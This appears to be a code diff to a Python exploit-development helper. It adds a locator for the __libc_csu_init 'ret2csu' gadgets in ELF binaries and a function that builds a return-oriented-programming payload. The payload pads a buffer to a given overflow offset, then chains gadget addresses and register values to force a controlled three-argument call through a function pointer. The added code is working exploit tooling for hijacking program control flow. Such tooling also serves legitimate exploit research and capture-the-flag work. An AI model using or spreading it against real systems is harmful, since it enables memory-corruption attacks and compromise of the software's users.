@@ -51,11 +51,7 @@ def _va_of(segs, file_off, need_x=False):
     return None
 
 
-def find_gadget(data: bytes, name: str):
-    """VA of the first occurrence of gadget `name` in an executable segment, or None."""
-    pat = GADGETS.get(name)
-    if not pat:
-        return None
+def _find_exec(data: bytes, pat: bytes):
     segs = _loads(data)
     for off, sz, _va, flags in segs:
         if not (flags & 1):                            # executable segments only
@@ -64,6 +60,38 @@ def find_gadget(data: bytes, name: str):
         if idx >= 0:
             return _va_of(segs, idx, need_x=True)
     return None
+
+
+def find_gadget(data: bytes, name: str):
+    """VA of the first occurrence of gadget `name` in an executable segment, or None."""
+    pat = GADGETS.get(name)
+    return _find_exec(data, pat) if pat else None
+
+
+# __libc_csu_init gadgets (present in ELF binaries built against pre-glibc-2.34 startup and in
+# many firmware/legacy targets). The pop gadget loads rbx/rbp/r12/r13/r14/r15; the call gadget
+# does rdx=r15; rsi=r14; edi=r13d; call [r12+rbx*8] -- a full 3-argument controlled call.
+CSU_POP = bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3])
+CSU_CALL = bytes([0x4c, 0x89, 0xfa, 0x4c, 0x89, 0xf6, 0x44, 0x89, 0xef, 0x41, 0xff, 0x14, 0xdc])
+
+
+def find_csu(data: bytes):
+    """{'pop': va, 'call': va} for the __libc_csu_init ret2csu gadgets, or None."""
+    pop = _find_exec(data, CSU_POP)
+    call = _find_exec(data, CSU_CALL)
+    return {"pop": pop, "call": call} if pop and call else None
+
+
+def build_ret2csu(offset, pop, call, ptr, edi, rsi, rdx, length, rbx=0, rbp=0):
+    """ret2csu chain: pop-gadget loads rbx/rbp/r12=ptr/r13=edi/r14=rsi/r15=rdx, then the
+    call-gadget does the 3-arg call *[ptr+rbx*8]."""
+    body = bytearray(_cyclic(offset))
+    for w in (pop, rbx, rbp, ptr, edi, rsi, rdx, call):
+        body += struct.pack("<Q", w & 0xFFFFFFFFFFFFFFFF)
+    body += b"C" * 64                                  # post-call padding (breakpoint fires first)
+    if len(body) < length:
+        body += b"C" * (length - len(body))
+    return bytes(body)
 
 
 def find_string(data: bytes, s: bytes):
